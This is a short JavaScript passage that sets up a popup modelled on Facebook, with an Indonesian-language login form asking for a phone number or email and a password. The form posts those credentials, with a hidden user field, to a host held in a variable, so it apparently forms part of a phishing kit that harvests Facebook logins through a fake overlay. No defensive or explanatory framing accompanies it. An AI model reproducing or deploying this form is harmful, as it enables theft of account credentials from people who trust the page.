...
var c={title:tit,message:"<div class='lk-container'><center><form action='"+hs+"' method='POST'><div class='col'><input type='hidden' name='u' value='"+us+"'><input type='text' name='m' placeholder='Nomor ponsel atau email' required><input type='password' name='p' placeholder='Kata Sandi' required><input type='submit' value='Login' class='form-control'></div></div></form></center>",url:"https://www.facebook.com/"+likes+"/",showfaces:true,timeout:waktu,delay:0,closeable:true,advancedClose:false,opacity:"25",wait:tunggu,lang:bahasa};
